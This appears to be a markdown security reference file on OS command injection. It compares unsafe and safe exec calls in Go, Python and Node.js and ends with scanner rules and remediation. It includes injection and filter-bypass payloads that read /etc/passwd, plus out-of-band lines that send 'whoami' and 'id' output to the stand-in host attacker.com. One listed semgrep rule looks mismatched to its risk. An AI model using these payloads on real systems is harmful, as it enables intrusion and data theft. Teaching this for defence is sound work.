---
name: command-injection
description: OS command injection — exec functions, shell metacharacters, blind channels, bypass techniques
---

# Command Injection

Command injection occurs when untrusted input is passed to a system shell or exec function without sanitisation. Full OS-level code execution with the privileges of the server process.

## Attack Surface

### Dangerous Functions by Language

**Go**
```go
// ❌ Shell injection via sh -c
exec.Command("sh", "-c", "ls " + userInput)
exec.Command("bash", "-c", fmt.Sprintf("ping %s", host))

// ✅ Safe — args passed as separate slice elements
exec.Command("ping", "-c", "1", host)
// Never use sh -c with user input
```

**Python**
```python
# ❌ All of these are injectable
os.system("dig " + domain)
subprocess.call("nslookup " + host, shell=True)   # shell=True is the danger
os.popen("whois " + input_data)

# ✅ Safe
subprocess.run(["dig", domain], capture_output=True)  # no shell=True
subprocess.run(["nslookup", host])
```

**Node.js**
```js
// ❌ Shell metacharacters interpreted
exec(`ls -la ${userPath}`)
execSync(`convert ${filename} output.png`)

// ✅ Safe
execFile('ls', ['-la', userPath])
spawnSync('convert', [filename, 'output.png'])
```

## Shell Metacharacters

```
;   command separator      ls ; cat /etc/passwd
&&  AND chaining           ls && id
||  OR chaining            false || id
|   pipe                   echo foo | bash
`   backtick subshell      `id`
$() subshell               $(id)
>   redirect write         id > /tmp/out
<   redirect read
\n  newline separator
%0a URL-encoded newline
```

## Bypass Techniques

```bash
# Whitespace bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'\x20'&&cat${X}/etc/passwd

# Quote bypass
c'a't /etc/passwd
c"a"t /etc/passwd

# Path obfuscation  
/???/??t /etc/passwd          # glob expansion
/bin/c[a]t /etc/passwd

# Encoded input
$(printf "\x63\x61\x74 /etc/passwd")  # hex encoded 'cat'
```

## Blind Command Injection Detection

When no output is returned, use out-of-band channels:

```bash
# DNS OOB
nslookup $(whoami).attacker.com
curl http://$(id | base64).attacker.com

# Time-based
sleep 5
ping -c 5 127.0.0.1

# File write
id > /var/www/html/proof.txt
```

## Scanner Coverage

| Risk | Scanner | Rule |
|------|---------|------|
| `shell=True` with input | semgrep | `python.lang.security.audit.subprocess-shell-true` |
| `exec.Command("sh", "-c")` | semgrep | `go.lang.security.audit.net.dynamic-httptrace-client` |
| `os.system` | bandit | B605, B607 |
| `eval` with input | semgrep | multiple rules |

## Remediation

1. **Never use `shell=True` / `sh -c`** with any user-controlled data
2. Pass arguments as separate slice elements — shell never interprets them
3. Whitelist allowed characters if shell is unavoidable: `[a-zA-Z0-9._-]`
4. Run processes as least-privilege user
5. Use seccomp/AppArmor to restrict syscalls the process can make
